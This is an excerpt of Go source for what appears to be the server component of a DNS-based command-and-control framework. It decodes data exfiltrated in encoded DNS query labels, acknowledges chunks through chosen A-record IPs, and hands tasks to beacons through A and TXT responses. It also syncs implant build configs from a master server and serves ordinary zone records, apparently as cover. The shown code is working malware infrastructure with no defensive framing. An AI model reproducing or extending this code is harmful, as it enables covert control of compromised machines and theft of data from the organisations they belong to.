...
func forwardDNSQuery(packet []byte, upstreamAddr string) ([]byte, error) {
	...
	if err != nil {
		...
		if msg, _, parseErr := parseMessage(packet); parseErr == nil {
			...
			return serializeMessage(respMsg)
		}
		return nil, err
	}
	defer conn.Close()
...
func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
	...
	// A RECORD EXFIL: Check for exfil frames in A record queries
	// This must come before C2 beacon processing to properly detect exfil traffic
	if q.Type == 1 {
		domainHints := buildExfilDomainHints(cfg.Domain, c2Manager.GetKnownDomains())
		if debugMode {
			logf("[Exfil] Checking A record query: %s against domain hints: %v", q.Name, domainHints)
		}
		if frame, matched, frameErr := parseLabelEncodedExfilFrame(q.Name, domainHints, c2Manager.GetEncryptionKey()); matched {
			ack := false
			if frameErr == nil {
				...
				err = frameErr
				if debugMode {
					logf("[Exfil] A record frame parse error: %v (query: %s)", frameErr, q.Name)
				}
			}
			if debugMode {
				logExfilFrameDecision(frame, ack, err)
			}
			// A RECORD EXFIL: Respond with server IP + 1 for ACK, random IP for NACK
			willAck := err == nil && ack
			if debugMode {
				logf("[Exfil] A record ACK decision: willAck=%v, err=%v, ack=%v", willAck, err, ack)
			}
			var responseIP []byte
			if willAck {
				responseIP = ackIPAddress(cfg.SvrAddr, true)
			} else {
				// NACK: Return a random-looking IP that won't match server IP + 1
				responseIP = []byte{192, 0, 2, 1} // TEST-NET-1, won't match any real server
			}
			answers := []DNSResourceRecord{{
				Name:  q.Name,
				Type:  1, // A record
			...
			logf("[Exfil] A record query not matched as exfil frame: %s", q.Name)
		}
	}

	// Check for C2 beacon communication first
	for _, q := range msg.Questions {
		if q.Type != 1 && q.Type != 16 {
			continue // only A and TXT carry C2 traffic; skip AAAA etc.
		}
		qname := strings.TrimSuffix(strings.ToLower(q.Name), ".")

		// Process potential C2 beacon query — pass DNS query type for A-record peek mode
		var queryInfo C2QueryInfo
		if c2Response, isC2, respEncrypted := c2Manager.processBeaconQuery(qname, clientIP, &queryInfo, q.Type); isC2 {
			...
			case 1: // A record - encode simple responses in IP
				ackIP := []byte{127, 0, 0, 1}
				taskIP := []byte{127, 0, 0, 2}

				if queryInfo.BeaconID != "" {
					c2Manager.mutex.RLock()
					var pc *BeaconPhaseConfig
					if beacon, exists := c2Manager.beacons[queryInfo.BeaconID]; exists {
						pc = beacon.PhaseConfig
						// Fall back to build phase config cache if beacon doesn't have one yet
						if pc == nil {
							if key := beacon.buildConfigKey(); key != "" {
								pc = c2Manager.buildPhaseConfigs[key]
							}
						}
					}
					if pc != nil {
						switch queryInfo.MsgType {
						case "CHK", "CHK_META":
							if pc.RegACKIP != "" {
								if ip4, ok := toIPv4(pc.RegACKIP); ok {
									ackIP = ip4
								}
							}
						case "POLL":
							if pc.PollACKIP != "" {
								if ip4, ok := toIPv4(pc.PollACKIP); ok {
									ackIP = ip4
								}
							}
							if pc.PollTaskIP != "" {
								if ip4, ok := toIPv4(pc.PollTaskIP); ok {
									taskIP = ip4
								}
							}
						case "DATA", "RESULT", "RESULT_META", "RESULT_COMPLETE":
							exfilIP := pc.ExfilACKIP
							if exfilIP == "" {
								exfilIP = pc.RegACKIP
							}
							if exfilIP != "" {
								if ip4, ok := toIPv4(exfilIP); ok {
									ackIP = ip4
								}
							}
						}
					}
					c2Manager.mutex.RUnlock()
				}
				...
				} else if c2Response == "TASK_PENDING" {
					answers = append(answers, DNSResourceRecord{
						Name:  q.Name,
						Type:  1,
						Class: 1,
			...
			case 16: // TXT record - encode response
				...
				} else if !respEncrypted {
					// Unencrypted beacon or stager (non-META/CHUNK) — plain base36
					encoded = base36EncodeString(c2Response)
					if debugMode {
						logf("[DEBUG] Plain base36 response (len=%d): %s", len(encoded), encoded)
					}
				} else {
					var encErr error
			...
			respMsg := buildResponse(msg, answers, 0)
			serialized, serErr := serializeMessage(respMsg)
			if serErr != nil {
				return nil, serErr
			}
			if debugMode {
	...
	for _, q := range msg.Questions {
		...
		case 1: // A
			...
			// Legitimate C2 traffic is handled earlier in handleQuery:
			//   1. parseLabelEncodedExfilFrame (dedicated exfil client, EX-prefixed frames)
			//   2. processBeaconQuery (beacon CHK/DATA/RESULT and stager STG/CHUNK)
		...
		case 5: // CNAME
			if tgt, ok := zoneCNAME[qname]; ok {
				...
				nameBytes, nameErr := appendName(nil, tgt)
				if nameErr != nil {
					return nil, nameErr
				}
				answers = append(answers, DNSResourceRecord{
		...
		case 2: // NS
			...
			if ns, ok := zoneNS[qname]; ok {
				nsWire, nsErr := appendName(nil, ns)
				if nsErr != nil {
					return nil, nsErr
				}
				answers = append(answers, DNSResourceRecord{
		...
		case 6: // SOA
			...
			if soa, ok := zoneSOA[qname]; ok {
				...
				var soaData []byte
				soaData, soaErr := appendName(soaData, soa.MNAME)
				if soaErr != nil {
					return nil, soaErr
				}
				soaData, soaErr = appendName(soaData, soa.RNAME)
				if soaErr != nil {
					return nil, soaErr
				}
	...
	if len(answers) > 0 {
		...
		addEdnsIfRequested(&respMsg, msg)
...
func main() {
	...
	_, _, _, _, buildFormats, buildPhaseConfigs, err := masterClient.Checkin(stats)
	if err != nil {
		...
		if len(buildFormats) > 0 {
			c2Manager.UpdateBuildFormats(buildFormats)
			LogDebug("Loaded %d build format(s) from Master", len(buildFormats))
		}
		if len(buildPhaseConfigs) > 0 {
			c2Manager.UpdateBuildPhaseConfigs(buildPhaseConfigs)
			LogDebug("Loaded %d build phase config(s) from Master", len(buildPhaseConfigs))
		}
	}
	...
	masterClient.StartPeriodicCheckin(30*time.Second, func() map[string]interface{} {
		...
		for _, sessionID := range completedExfil {
			c2Manager.exfilMutex.Lock()
			session, exists := c2Manager.exfilSessions[sessionID]
			needsFinalize := exists && session.Status != "completed"
			c2Manager.exfilMutex.Unlock()
		...
		c2Manager.UpdateBuildFormats(formats)
		LogDebug("Updated %d build format(s) from Master", len(formats))
	}, func(configs map[string]*BeaconPhaseConfig) {
		c2Manager.UpdateBuildPhaseConfigs(configs)
		LogDebug("Updated %d build phase config(s) from Master", len(configs))
	})
	...
	// Start periodic log forwarding to Archon (every 30 seconds)
	masterClient.StartPeriodicLogForward(30 * time.Second)
	...
	// Start DNS server with worker pool for concurrent query processing
	...
	// Start TCP DNS listener (required by RFC 5966; Google DNS marks TCP-less servers as unreachable)
	tcpListener, tcpErr := net.Listen("tcp4", bindAddr)
	if tcpErr != nil {
		LogWarn("Failed to start TCP DNS listener on %s: %v", bindAddr, tcpErr)
	} else {
		LogInfo("TCP DNS listener started on %s", bindAddr)
		go func() {
			...
			for {
				...
				if err != nil {
					...
					LogDebug("TCP accept error: %v", err)
					continue
				}
